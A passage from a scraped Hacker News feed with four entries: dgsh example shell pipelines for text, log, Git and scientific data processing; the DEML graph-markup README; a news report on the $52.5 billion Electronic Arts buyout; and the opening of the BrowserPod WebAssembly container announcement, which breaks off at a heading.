MD5 sums with the corresponding file names # Join expects two inputs, second will come from scatter # XXX make streaming input identifiers transparent to users join -2 2 | # Output same files on a single line awk ' BEGIN {ORS=""} $1 != prev &amp;amp;&amp;amp; prev {print "\n"} END {if (prev) print "\n"} {if (prev) print " "; prev = $1; print $2}'&lt;/quote&gt;&lt;p&gt;Highlight the words that are misspelled in the command's first argument. Demonstrates stream processing with multipipes and the avoidance of pass-through constructs to avoid deadlocks.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh export LC_ALL=C tee | {{ # Find errors {{ # Obtain list of words in text tr -cs A-Za-z \\n | tr A-Z a-z | sort -u # Ensure dictionary is compatibly sorted sort /usr/share/dict/words }} | # List errors as a set difference comm -23 # Pass through text cat }} | grep --fixed-strings --file=- --ignore-case --color --word-regex --context=2&lt;/quote&gt;&lt;p&gt;Read text from the standard input and list words containing a two-letter palindrome, words containing four consonants, and words longer than 12 characters.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Consistent sorting across machines export LC_ALL=C # Stream input from file cat $1 | # Split input one word per line tr -cs a-zA-Z \\n | # Create list of unique words sort -u | tee | {{ # Pass through the original words cat # List two-letter palindromes sed 's/.*\(.\)\(.\)\2\1.*/p: \1\2-\2\1/;t g' # List four consecutive consonants sed -E 's/.*([^aeiouyAEIOUY]{4}).*/c: \1/;t g' # List length of words longer than 12 characters awk '{if (length($1) &amp;gt; 12) print "l:", length($1); else print ""}' }} | # Paste the four streams side-by-side paste | # List only words satisfying one or more properties fgrep :&lt;/quote&gt;&lt;p&gt;Creates a report for a fixed-size web log file read from the standard input. Demonstrates the combined use of multipipe blocks, writeval and readval to store and retrieve values, and functions in the scatter block. Used to measure throughput increase achieved through parallelism.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Output the top X elements of the input by the number of their occurrences # X is the first argument toplist() { uniq -c | sort -rn | head -$1 echo } # Output the argument as a section header header() { echo echo "$1" echo "$1" | sed 's/./-/g' } # Consistent sorting export LC_ALL=C export -f toplist export -f header if [ -z "${DGSH_DRAW_EXIT}" ] then cat &amp;lt;&amp;lt;EOF WWW server statistics ===================== Summary ------- EOF fi tee | {{ # Number of accesses echo -n 'Number of accesses: ' dgsh-readval -l -s nAccess # Number of transferred bytes awk '{s += $NF} END {print s}' | tee | {{ echo -n 'Number of Gbytes transferred: ' awk '{print $1 / 1024 / 1024 / 1024}' dgsh-writeval -s nXBytes }} echo -n 'Number of hosts: ' dgsh-readval -l -q -s nHosts echo -n 'Number of domains: ' dgsh-readval -l -q -s nDomains echo -n 'Number of top level domains: ' dgsh-readval -l -q -s nTLDs echo -n 'Number of different pages: ' dgsh-readval -l -q -s nUniqPages echo -n 'Accesses per day: ' dgsh-readval -l -q -s nDayAccess echo -n 'MBytes per day: ' dgsh-readval -l -q -s nDayMB # Number of log file bytes echo -n 'MBytes log file size: ' wc -c | awk '{print $1 / 1024 / 1024}' # Host names awk '{print $1}' | tee | {{ # Number of accesses wc -l | dgsh-writeval -s nAccess # Sorted hosts sort | tee | {{ # Unique hosts uniq | tee | {{ # Number of hosts wc -l | dgsh-writeval -s nHosts # Number of TLDs awk -F. '$NF !~ /[0-9]/ {print $NF}' | sort -u | wc -l | dgsh-writeval -s nTLDs }} # Top 10 hosts {{ call 'header "Top 10 Hosts"' call 'toplist 10' }} }} # Top 20 TLDs {{ call 'header "Top 20 Level Domain Accesses"' awk -F. '$NF !~ /^[0-9]/ {print $NF}' | sort | call 'toplist 20' }} # Domains awk -F. 'BEGIN {OFS = "."} $NF !~ /^[0-9]/ {$1 = ""; print}' | sort | tee | {{ # Number of domains uniq | wc -l | dgsh-writeval -s nDomains # Top 10 domains {{ call 'header "Top 10 Domains"' call 'toplist 10' }} }} }} # Hosts by volume {{ call 'header "Top 10 Hosts by Transfer"' awk ' {bytes[$1] += $NF} END {for (h in bytes) print bytes[h], h}' | sort -rn | head -10 }} # Sorted page name requests awk '{print $7}' | sort | tee | {{ # Top 20 area requests (input is already sorted) {{ call 'header "Top 20 Area Requests"' awk -F/ '{print $2}' | call 'toplist 20' }} # Number of different pages uniq | wc -l | dgsh-writeval -s nUniqPages # Top 20 requests {{ call 'header "Top 20 Requests"' call 'toplist 20' }} }} # Access time: dd/mmm/yyyy:hh:mm:ss awk '{print substr($4, 2)}' | tee | {{ # Just dates awk -F: '{print $1}' | tee | {{ # Number of days uniq | wc -l | tee | {{ awk ' BEGIN { "dgsh-readval -l -x -s nAccess" | getline NACCESS;} {print NACCESS / $1}' | dgsh-writeval -s nDayAccess awk ' BEGIN { "dgsh-readval -l -x -q -s nXBytes" | getline NXBYTES;} {print NXBYTES / $1 / 1024 / 1024}' | dgsh-writeval -s nDayMB }} {{ call 'header "Accesses by Date"' uniq -c }} # Accesses by day of week {{ call 'header "Accesses by Day of Week"' sed 's|/|-|g' | call '(date -f - +%a 2&amp;gt;/dev/null || gdate -f - +%a)' | sort | uniq -c | sort -rn }} }} # Hour {{ call 'header "Accesses by Local Hour"' awk -F: '{print $2}' | sort | uniq -c }} }} dgsh-readval -q -s nAccess }} | cat&lt;/quote&gt;&lt;p&gt;Read text from the standard input and create files containing word, character, digram, and trigram frequencies.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Consistent sorting across machines export LC_ALL=C # Convert input into a ranked frequency list ranked_frequency() { awk '{count[$1]++} END {for (i in count) print count[i], i}' | # We want the standard sort here sort -rn } # Convert standard input to a ranked frequency list of specified n-grams ngram() { local N=$1 perl -ne 'for ($i = 0; $i &amp;lt; length($_) - '$N'; $i++) { print substr($_, $i, '$N'), "\n"; }' | ranked_frequency } export -f ranked_frequency export -f ngram tee | {{ # Split input one word per line tr -cs a-zA-Z \\n | tee | {{ # Digram frequency call 'ngram 2 &amp;gt;digram.txt' # Trigram frequency call 'ngram 3 &amp;gt;trigram.txt' # Word frequency call 'ranked_frequency &amp;gt;words.txt' }} # Store number of characters to use in awk below wc -c | dgsh-writeval -s nchars # Character frequency sed 's/./&amp;amp;\ /g' | # Print absolute call 'ranked_frequency' | awk 'BEGIN { "dgsh-readval -l -x -q -s nchars" | getline NCHARS OFMT = "%.2g%%"} {print $1, $2, $1 / NCHARS * 100}' &amp;gt; character.txt }}&lt;/quote&gt;&lt;p&gt;Given as an argument a directory containing object files, show which symbols are declared with global visibility, but should have been declared with file-local (static) visibility instead. Demonstrates the use of dgsh-capable comm (1) to combine data from two sources.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Find object files find "$1" -name \*.o | # Print defined symbols xargs nm | tee | {{ # List all defined (exported) symbols awk 'NF == 3 &amp;amp;&amp;amp; $2 ~ /[A-Z]/ {print $3}' | sort # List all undefined (imported) symbols awk '$1 == "U" {print $2}' | sort }} | # Print exports that are not imported comm -23&lt;/quote&gt;&lt;p&gt;Given two directory hierarchies A and B passed as input arguments (where these represent a project at different parts of its lifetime) copy the files of hierarchy A to a new directory, passed as a third argument, corresponding to the structure of directories in B. Demonstrates the use of join to process results from two inputs and the use of gather to order asynchronously produced results.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh if [ -z "${DGSH_DRAW_EXIT}" -a \( ! -d "$1" -o ! -d "$2" -o -z "$3" \) ] then echo "Usage: $0 dir-1 dir-2 new-dir-name" 1&amp;gt;&amp;amp;2 exit 1 fi NEWDIR="$3" export LC_ALL=C line_signatures() { find $1 -type f -name '*.[chly]' -print | # Split path name into directory and file sed 's|\(.*\)/\([^/]*\)|\1 \2|' | while read dir file do # Print "directory filename content" of lines with # at least one alphabetic character # The fields are separated by and sed -n "/[a-z]/s|^|$dir$file|p" "$dir/$file" done | # Error: multi-character tab '\001\001' sort -T `pwd` -t -k 2 } export -f line_signatures {{ # Generate the signatures for the two hierarchies call 'line_signatures "$1"' -- "$1" call 'line_signatures "$1"' -- "$2" }} | # Join signatures on file name and content join -t -1 2 -2 2 | # Print filename dir1 dir2 sed 's///g' | awk -F 'BEGIN{OFS=" "}{print $1, $3, $4}' | # Unique occurrences sort -u | tee | {{ # Commands to copy awk '{print "mkdir -p '$NEWDIR'/" $3 ""}' | sort -u awk '{print "cp " $2 "/" $1 " '$NEWDIR'/" $3 "/" $1 ""}' }} | # Order: first make directories, then copy files # TODO: dgsh-tee does not pass along first incoming stream cat | sh&lt;/quote&gt;&lt;p&gt;Process the Git history, and create two PNG diagrams depicting committer activity over time. The most active committers appear at the center vertical of the diagram. Demonstrates image processing, mixining of synchronous and asynchronous processing in a scatter block, and the use of an dgsh-compliant join command.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Commit history in the form of ascending Unix timestamps, emails git log --pretty=tformat:'%at %ae' | # Filter records according to timestamp: keep (100000, now) seconds awk 'NF == 2&amp;amp; $1 &amp;gt; 100000&amp;amp; $1 &amp;lt; '`date +%s` | sort -n | tee | {{ {{ # Calculate number of committers awk '{print $2}' | sort -u | wc -l | tee | {{ dgsh-writeval -s committers1 dgsh-writeval -s committers2 dgsh-writeval -s committers3 }} # Calculate last commit timestamp in seconds tail -1 | awk '{print $1}' # Calculate first commit timestamp in seconds head -1 | awk '{print $1}' }} | # Gather last and first commit timestamp cat | # Make one space-delimeted record tr '\n' ' ' | # Compute the difference in days awk '{print int(($1 - $2) / 60 / 60 / 24)}' | # Store number of days dgsh-writeval -s days sort -k2 # &amp;lt;timestamp, email&amp;gt; # Place committers left/right of the median # according to the number of their commits awk '{print $2}' | sort | uniq -c | sort -n | awk ' BEGIN { "dgsh-readval -l -x -q -s committers1" | getline NCOMMITTERS l = 0; r = NCOMMITTERS;} {print NR % 2 ? l++ : --r, $2}' | sort -k2 # &amp;lt;left/right, email&amp;gt; }} | # Join committer positions with commit time stamps # based on committer email join -j 2 | # &amp;lt;email, timestamp, left/right&amp;gt; # Order by timestamp sort -k 2n | tee | {{ # Create portable bitmap echo 'P1' {{ dgsh-readval -l -q -s committers2 dgsh-readval -l -q -s days }} | cat | tr '\n' ' ' | awk '{print $1, $2}' perl -na -e ' BEGIN { open(my $ncf, "-|", "dgsh-readval -l -x -q -s committers3"); $ncommitters = &amp;lt;$ncf&amp;gt;; @empty[$ncommitters - 1] = 0; @committers = @empty; } sub out { print join("", map($_ ? "1" : "0", @committers)), "\n"; } $day = int($F[1] / 60 / 60 / 24); $pday = $day if (!defined($pday)); while ($day != $pday) { out(); @committers = @empty; $pday++; } $committers[$F[2]] = 1; END { out(); } ' }} | cat | # Enlarge points into discs through morphological convolution pgmmorphconv -erode &amp;lt;( cat &amp;lt;&amp;lt;EOF P1 7 7 1 1 1 0 1 1 1 1 1 0 0 0 1 1 1 0 0 0 0 0 1 0 0 0 0 0 0 0 1 0 0 0 0 0 1 1 1 0 0 0 1 1 1 1 1 0 1 1 1 EOF ) | tee | {{ # Full-scale image pnmtopng &amp;gt;large.png # A smaller image pamscale -width 640 | pnmtopng &amp;gt;small.png }}&lt;/quote&gt;&lt;p&gt;Count number of times each word appears in the specified input file(s) Demonstrates parallel execution mirroring the Hadoop WordCount example via the dgsh-parallel command. In contrast to GNU parallel, the block generated by dgsh-parallel has N input and output streams, which can be combined by any dgsh-compatible tool, such as dgsh-merge-sum or sort -m.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Number of processes N=8 # Collation order for sorting export LC_ALL=C # Scatter input dgsh-tee -s | # Emulate Java's default StringTokenizer, sort, count dgsh-parallel -n $N "tr -s ' \t\n\r\f' '\n' | sort -S 512M | uniq -c" | # Merge sorted counts by providing N input channels dgsh-merge-sum $(for i in $(seq $N) ; do printf '&amp;lt;| ' ; done)&lt;/quote&gt;&lt;p&gt;Given the specification of two publication venues, read a compressed DBLP computer science bibliography from the standard input (e.g. piped from curl -s http://dblp.uni-trier.de/xml/dblp.xml.gz or from a locally cached copy) and output the number of papers published in each of the two venues as well as the number of authors who have published only in the first venue, the number who have published only in the second one, and authors who have published in both. The venues are specified through the script's first two command-line arguments as a DBLP key prefix, e.g. journals/acta/, conf/icse/, journals/software/, conf/iwpc/, or conf/msr/. Demonstrates the use of dgsh-wrap -e to have sed(1) create two output streams and the use of tee to copy a pair of streams into four ones.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Extract and sort author names sorted_authors() { sed -n 's/&amp;lt;author&amp;gt;\([^&amp;lt;]*\)&amp;lt;\/author&amp;gt;/\1/p' | sort } # Escape a string to make it a valid sed(1) pattern escape() { echo "$1" | sed 's/\([/\\]\)/\\\1/g' } export -f sorted_authors if [ ! "$2" -a ! "$DGSH_DOT_DRAW"] ; then echo "Usage: $0 key1 key2" 1&amp;gt;&amp;amp;2 echo "Example: $0 conf/icse/ journals/software/" 1&amp;gt;&amp;amp;2 exit 1 fi gzip -dc | # Output the two venue authors as two output streams dgsh-wrap -e sed -n " /^&amp;lt;.*key=\"$(escape $1)/,/&amp;lt;title&amp;gt;/ w &amp;gt;| /^&amp;lt;.*key=\"$(escape $2)/,/&amp;lt;title&amp;gt;/ w &amp;gt;|" | # 2 streams in 4 streams out: venue1, venue2, venue1, venue2 tee | {{ {{ echo -n "$1 papers: " grep -c '^&amp;lt;.* mdate=.* key=' echo -n "$2 papers: " grep -c '^&amp;lt;.* mdate=.* key=' }} {{ call sorted_authors call sorted_authors }} | comm | {{ echo -n "Authors only in $1: " wc -l echo -n "Authors only in $2: " wc -l echo -n 'Authors common in both venues: ' wc -l }} }} | cat&lt;/quote&gt;&lt;p&gt;Create two graphs: 1) a broadened pulse and the real part of its 2D Fourier transform, and 2) a simulated air wave and the amplitude of its 2D Fourier transform. Demonstrates using the tools of the Madagascar shared research environment for computational data analysis in geophysics and related fields. Also demonstrates the use of two scatter blocks in the same script, and the used of named streams.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh mkdir -p Fig # The SConstruct SideBySideIso "Result" method side_by_side_iso() { vppen size=r vpstyle=n gridnum=2,1 /dev/stdin $* } export -f side_by_side_iso # A broadened pulse and the real part of its 2D Fourier transform sfspike n1=64 n2=64 d1=1 d2=1 nsp=2 k1=16,17 k2=5,5 mag=16,16 \ label1='time' label2='space' unit1= unit2= | sfsmooth rect2=2 | sfsmooth rect2=2 | tee | {{ sfgrey pclip=100 wanttitle=n sffft1 | sffft3 axis=2 pad=1 | sfreal | tee | {{ sfwindow f1=1 | sfreverse which=3 cat }} | sfcat axis=1 "&amp;lt;|" | sfgrey pclip=100 wanttitle=n label1="1/time" label2="1/space" }} | call_with_stdin side_by_side_iso '&amp;lt;|' yscale=1.25 &amp;gt;Fig/ft2dofpulse.vpl # A simulated air wave and the amplitude of its 2D Fourier transform sfspike n1=64 d1=1 o1=32 nsp=4 k1=1,2,3,4 mag=1,3,3,1 \ label1='time' unit1= | sfspray n=32 d=1 o=0 | sfput label2=space | sflmostretch delay=0 v0=-1 | tee | {{ sfwindow f2=1 | sfreverse which=2 cat }} | sfcat axis=2 "&amp;lt;|" | tee | {{ sfgrey pclip=100 wanttitle=n sffft1 | sffft3 sign=1 | tee | {{ sfreal sfimag }} | dgsh-wrap -e sfmath nostdin=y re="&amp;lt;|" im="&amp;lt;|" \ output="sqrt(re*re+im*im)" | tee | {{ sfwindow f1=1 | sfreverse which=3 cat }} | sfcat axis=1 "&amp;lt;|" | sfgrey pclip=100 wanttitle=n label1="1/time" label2="1/space" }} | call_with_stdin side_by_side_iso '&amp;lt;|' yscale=1.25 &amp;gt;Fig/airwave.vpl wait&lt;/quote&gt;&lt;p&gt;Nuclear magnetic resonance in-phase/anti-phase channel conversion and processing in heteronuclear single quantum coherence spectroscopy. Demonstrate processing of NMR data using the NMRPipe family of programs.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # The conversion is configured for the following file: # http://www.bmrb.wisc.edu/ftp/pub/bmrb/timedomain/bmr6443/timedomain_data/c13-hsqc/june11-se-6426-CA.fid/fid var2pipe -in $1 \ -xN 1280 -yN 256 \ -xT 640 -yT 128 \ -xMODE Complex -yMODE Complex \ -xSW 8000 -ySW 6000 \ -xOBS 599.4489584 -yOBS 60.7485301 \ -xCAR 4.73 -yCAR 118.000 \ -xLAB 1H -yLAB 15N \ -ndim 2 -aq2D States \ -verb | tee | {{ # IP/AP channel conversion # See http://tech.groups.yahoo.com/group/nmrpipe/message/389 nmrPipe | nmrPipe -fn SOL | nmrPipe -fn SP -off 0.5 -end 0.98 -pow 2 -c 0.5 | nmrPipe -fn ZF -auto | nmrPipe -fn FT | nmrPipe -fn PS -p0 177 -p1 0.0 -di | nmrPipe -fn EXT -left -sw -verb | nmrPipe -fn TP | nmrPipe -fn COADD -cList 1 0 -time | nmrPipe -fn SP -off 0.5 -end 0.98 -pow 1 -c 0.5 | nmrPipe -fn ZF -auto | nmrPipe -fn FT | nmrPipe -fn PS -p0 0 -p1 0 -di | nmrPipe -fn TP | nmrPipe -fn POLY -auto -verb &amp;gt;A nmrPipe | nmrPipe -fn SOL | nmrPipe -fn SP -off 0.5 -end 0.98 -pow 2 -c 0.5 | nmrPipe -fn ZF -auto | nmrPipe -fn FT | nmrPipe -fn PS -p0 177 -p1 0.0 -di | nmrPipe -fn EXT -left -sw -verb | nmrPipe -fn TP | nmrPipe -fn COADD -cList 0 1 -time | nmrPipe -fn SP -off 0.5 -end 0.98 -pow 1 -c 0.5 | nmrPipe -fn ZF -auto | nmrPipe -fn FT | nmrPipe -fn PS -p0 -90 -p1 0 -di | nmrPipe -fn TP | nmrPipe -fn POLY -auto -verb &amp;gt;B }} # We use temporary files rather than streams, because # addNMR mmaps its input files. The diagram displayed in the # example shows the notional data flow. if [ -z "${DGSH_DRAW_EXIT}" ] then addNMR -in1 A -in2 B -out A+B.dgsh.ft2 -c1 1.0 -c2 1.25 -add addNMR -in1 A -in2 B -out A-B.dgsh.ft2 -c1 1.0 -c2 1.25 -sub fi&lt;/quote&gt;&lt;p&gt;Calculate the iterative FFT for n = 8 in parallel. Demonstrates combined use of permute and multipipe blocks.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh dgsh-fft-input $1 | perm 1,5,3,7,2,6,4,8 | {{ {{ dgsh-w 1 0 dgsh-w 1 0 }} | perm 1,3,2,4 | {{ dgsh-w 2 0 dgsh-w 2 1 }} {{ dgsh-w 1 0 dgsh-w 1 0 }} | perm 1,3,2,4 | {{ dgsh-w 2 0 dgsh-w 2 1 }} }} | perm 1,5,3,7,2,6,4,8 | {{ dgsh-w 3 0 dgsh-w 3 1 dgsh-w 3 2 dgsh-w 3 3 }} | perm 1,5,2,6,3,7,4,8 | cat&lt;/quote&gt;&lt;p&gt;Reorder columns in a CSV document. Demonstrates the combined use of tee, cut, and paste.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh tee | {{ cut -d , -f 5-6 - cut -d , -f 2-4 - }} | paste -d ,&lt;/quote&gt;&lt;p&gt; Windows-like DIR command for the current directory. Nothing that couldn't be done with &lt;code&gt;ls -l | awk&lt;/code&gt;.
Demonstrates use of wrapped commands with no input (df, echo).
&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh ls -n | tee | {{ # Reorder fields in DIR-like way awk '!/^total/ {print $6, $7, $8, $1, sprintf("%8d", $5), $9}' # Count number of files wc -l | tr -d \\n # Print label for number of files echo -n ' File(s) ' # Tally number of bytes awk '{s += $5} END {printf("%d bytes\n", s)}' # Count number of directories grep -c '^d' | tr -d \\n # Print label for number of dirs and calculate free bytes df -h . | awk '!/Use%/{print " Dir(s) " $4 " bytes free"}' }} | cat&lt;/quote&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www2.dmst.aueb.gr/dds/sw/dgsh/"/><published>2025-09-30T13:39:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45425714</id><title>Deml: The Directed Acyclic Graph Elevation Markup Language</title><updated>2025-09-30T16:43:05.267367+00:00</updated><content>&lt;doc fingerprint="24003ae74061c391"&gt;
  &lt;main&gt;
    &lt;p&gt;Languages designed to represent all types of graph data structures, such as Graphviz's DOT Language and Mermaid JS's flowchart syntax, don't take advantage of the properties specific to DAGs (Directed Acyclic Graphs).&lt;/p&gt;
    &lt;p&gt;DAGs act like rivers. Water doesn't flow upstream (tides and floods being exceptions). Sections of a river at the same elevation can't be the inputs or outputs of each other, like the nodes C, D, and E in the image below. Their input is B. C outputs to F, while D and E output to G.&lt;/p&gt;
    &lt;p&gt;DEML's goal is to use this ordering as part of the file syntax to make it easier for humans to parse. In DEML we represent an elevation marker with &lt;code&gt;----&lt;/code&gt; on a new line. The order of elevation clusters is significant, but the order of nodes between two &lt;code&gt;----&lt;/code&gt; elevation markers is not significant.&lt;/p&gt;
    &lt;code&gt;UpRiver &amp;gt; A
----
A &amp;gt; B
----
B &amp;gt; C | D | E
----
C
D
E
----
F &amp;lt; C
G &amp;lt; D | E &amp;gt; DownRiver
----
DownRiver &amp;lt; F&lt;/code&gt;
    &lt;p&gt;Nodes are defined by the first word on a line. The defined node can point to its outputs with &lt;code&gt;&amp;gt;&lt;/code&gt; and to its inputs with &lt;code&gt;&amp;lt;&lt;/code&gt;. Inputs and outputs are separated by &lt;code&gt;|&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Dagrs is a library for running multiple tasks with dependencies defined in a DAG. In DEML, shell commands can be assigned to a node with &lt;code&gt;=&lt;/code&gt;. DEML files can be run via dag-rs with the comand &lt;code&gt;deml run -i &amp;lt;filepath&amp;gt;&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To compare the difference in readability, here is the Dagrs YAML example in both YAML and DEML&lt;/p&gt;
    &lt;code&gt;dagrs:
  a:
    name: "Task 1"
    after: [ b, c ]
    cmd: echo a
  b:
    name: "Task 2"
    after: [ c, f, g ]
    cmd: echo b
  c:
    name: "Task 3"
    after: [ e, g ]
    cmd: echo c
  d:
    name: "Task 4"
    after: [ c, e ]
    cmd: echo d
  e:
    name: "Task 5"
    after: [ h ]
    cmd: echo e
  f:
    name: "Task 6"
    after: [ g ]
    cmd: python3 ./tests/config/test.py
  g:
    name: "Task 7"
    after: [ h ]
    cmd: node ./tests/config/test.js
  h:
    name: "Task 8"
    cmd: echo h&lt;/code&gt;
    &lt;code&gt;H &amp;gt; E | G = echo h
----
G = node ./tests/config/test.js
E = echo e
----
F &amp;lt; G = python3 ./tests/config/test.py
C &amp;lt; E | G = echo c
----
B &amp;lt; C | F | G = echo b
D &amp;lt; C | E = echo d
----
A &amp;lt; B | C = echo a&lt;/code&gt;
    &lt;p&gt;To convert DEML files to Mermaid Diagram files (.mmd) use the command &lt;code&gt;deml mermaid -i &amp;lt;inputfile&amp;gt; -o &amp;lt;outputfile&amp;gt;&lt;/code&gt;. The mermaid file can be used to generate an image at mermaid.live&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Put my idea for an elevation based DAG representation into the wild&lt;/item&gt;
      &lt;item&gt;Run DAGs with dag-rs&lt;/item&gt;
      &lt;item&gt;Convert DEML files to Mermaid Diagram files&lt;/item&gt;
      &lt;item&gt;Syntax highlighting tree-sitter-deml&lt;/item&gt;
      &lt;item&gt;Add a syntax to label edges&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I was thinking about how it's annoying in languages like C when function declaration order matters. Then I wondered if there could be a case when it would be a nice feature for declaration order to matter and I thought of DAGs.&lt;/p&gt;
    &lt;p&gt;Licensed under either of&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Apache License, Version 2.0 (LICENSE-APACHE or http://www.apache.org/licenses/LICENSE-2.0)&lt;/item&gt;
      &lt;item&gt;MIT license (LICENSE-MIT or http://opensource.org/licenses/MIT)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;at your option.&lt;/p&gt;
    &lt;p&gt;Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/Mcmartelle/deml"/><published>2025-09-30T14:12:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45425897</id><title>Electronic Arts to be acquired for $52B in largest private equity buyout</title><updated>2025-09-30T16:43:05.058933+00:00</updated><content>&lt;doc fingerprint="2e40f5ddea30c7af"&gt;
  &lt;main&gt;
    &lt;p&gt;Electronic Arts, maker of video games like “Madden NFL,” “Battlefield,” and “The Sims,” is being acquired for $52.5 billion in what could become the largest-ever buyout funded by private-equity firms.&lt;/p&gt;
    &lt;p&gt;The private equity firm Silver Lake Partners, Saudi Arabia’s sovereign wealth fund PIF, and Affinity Partners will pay EA’s stockholders $210 per share. Affinity Partners is run by President Donald Trump’s son-in-law, Jared Kushner.&lt;/p&gt;
    &lt;p&gt;PIF, which was already the largest insider stakeholder in Electronic Arts, will be rolling over its existing 9.9% stake in the company.&lt;/p&gt;
    &lt;p&gt;The commitment to the massive deal is inline with recent activity by Saudi Arabia’s sovereign wealth fund, wrote Andrew Marok of Raymond James.&lt;/p&gt;
    &lt;p&gt;“The Saudi PIF has been a very active player in the video gaming market since 2022, taking minority stakes in most scaled public video gaming publishers, and also outright purchases of companies like ESL, FACEIT, and Scopely,” he wrote. “The PIF has made its intentions to scale its gaming arm, Savvy Gaming Group, clear, and the EA deal would represent the biggest such move to date by some distance.”&lt;/p&gt;
    &lt;p&gt;Electronic Arts would be taken private and its headquarters will remain in Redwood City, California.&lt;/p&gt;
    &lt;p&gt;The total value of the deal eclipses the $32 billion price paid to take Texas utility TXU private in 2007.&lt;/p&gt;
    &lt;p&gt;If the transaction closes as anticipated, it will end EA’s 36-year history as a publicly traded company that began with its shares ending its first day of trading at a split-adjusted 52 cents.&lt;/p&gt;
    &lt;p&gt;The IPO came seven years after EA was founded by former Apple employee William “Trip” Hawkins, who began playing analog versions of baseball and football made by “Strat-O-Matic” as a teenager during the 1960s.&lt;/p&gt;
    &lt;p&gt;CEO Andrew Wilson has led the company since 2013 and he will remain in that role, the firms said Monday.&lt;/p&gt;
    &lt;p&gt;“Electronic Arts is an extraordinary company with a world-class management team and a bold vision for the future,” said Kushner, who serves as CEO of Affinity Partners. “I’ve admired their ability to create iconic, lasting experiences, and as someone who grew up playing their games — and now enjoys them with his kids — I couldn’t be more excited about what’s ahead.”&lt;/p&gt;
    &lt;p&gt;This marks the second high-profile deal involving Silver Lake and a technology company with a legion of loyal fans in recent weeks. Silver Lake is also part of a newly formed joint venture spearheaded by Oracle involved in a deal to take over the U.S. oversight of TikTok’s social video platform, although all the details of that complex transaction haven’t been divulged yet.&lt;/p&gt;
    &lt;p&gt;Silver Lake has also previously bought out two other well-known technology companies, the now-defunct video calling service Skype in a $1.9 billion deal completed in 2009, and a $24.9 billion buyout of personal computer maker Dell in 2013. After Dell restructured its operations as a private company, it returned to the stock market with publicly traded shares in 2018.&lt;/p&gt;
    &lt;p&gt;By going private, EA will be able to reprogram its operations without being subjected to the investment pressures and scrutiny that sometimes compel publicly held companies to make short-sighted decisions aimed at meeting quarterly financial targets. Although its video games still have a fervent following, EA’s annual revenues have been stagnant during the past three fiscal years, hovering from $7.4 billion to $7.6 billion.&lt;/p&gt;
    &lt;p&gt;Meanwhile, one of its biggest rivals Activision Blizzard was snapped up by technology powerhouse Microsoft for nearly $69 billion in 2023, while the competition from mobile video game makers such as Epic Games has intensified.&lt;/p&gt;
    &lt;p&gt;After being taken private, formerly public companies often undergo extensive cost-cutting that includes layoffs, although there has been no indication that will be the case with EA. After jettisoning about 5% of its workforce in 2024, EA ended March with 14,500 employees and then laid off several hundred people in May.&lt;/p&gt;
    &lt;p&gt;The deal is expected to close in the first quarter of 2027. It still needs approval from EA shareholders.&lt;/p&gt;
    &lt;p&gt;EA’s stock rose more than 5% before the opening bell.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.nbcnews.com/business/business-news/electronic-arts-acquired-largest-ever-private-equity-buyout-rcna234432"/><published>2025-09-30T14:27:30+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45426099</id><title>BrowserPod: In-browser full-stack environments for IDEs and Agents via WASM</title><updated>2025-09-30T16:43:04.841742+00:00</updated><content>&lt;doc fingerprint="d3380c7ccb3ed58"&gt;
  &lt;main&gt;
    &lt;p&gt;We’re excited to introduce BrowserPod a WebAssembly-based, in-browser container technology that runs full-stack development environments across multiple languages.&lt;/p&gt;
    &lt;p&gt;BrowserPod is a generalised, more powerful alternative to WebContainers, with advanced networking capabilities and flexible multi-runtime support. Containers, called Pods, run completely client-side. At their core there is a flexible WebAssembly-based engine that can execute multiple programming languages.&lt;/p&gt;
    &lt;p&gt;Each Pod can:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Run multiple processes or services in parallel, with real concurrency powered by WebWorkers&lt;/item&gt;
      &lt;item&gt;Access a scalable block-based filesystem with privacy-preserving browser-local persistence.&lt;/item&gt;
      &lt;item&gt;Expose virtualized HTTP / REST services to the internet via Portals&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Pods are fast booting, since no provision of server-side resources is required. Moreover, multiple Pods can run in each browser tab, enabling complex deployments.&lt;/p&gt;
    &lt;p&gt;BrowserPod is conceptually similar to WebContainers, but is designed from the ground up to be language-agnostic, to support inbound networking, and to be integrated within the Leaning Technologies ecosystem.&lt;/p&gt;
    &lt;p&gt;BrowserPod will be released in late November, with an initial focus on Node.js environments and a well defined path to support additional stacks, with Python and Ruby as immediate priorities.&lt;/p&gt;
    &lt;p&gt;Further capabilities will become available later by integrating BrowserPod with CheerpX, our x86-to-WebAssembly virtualization engine. In particular, we plan to support React Native environments in 2026.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is BrowserPod for?&lt;/head&gt;
